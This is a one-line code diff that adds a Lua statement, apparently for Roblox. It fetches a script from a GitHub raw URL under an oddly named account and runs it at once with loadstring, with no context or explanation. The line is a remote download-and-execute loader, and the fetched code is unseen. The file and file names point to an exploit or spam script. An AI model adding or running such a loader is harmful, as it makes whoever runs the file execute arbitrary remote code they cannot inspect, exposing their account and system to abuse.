@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/analog-horror-spam3-jtmebdjtoc0crj.lua"))()
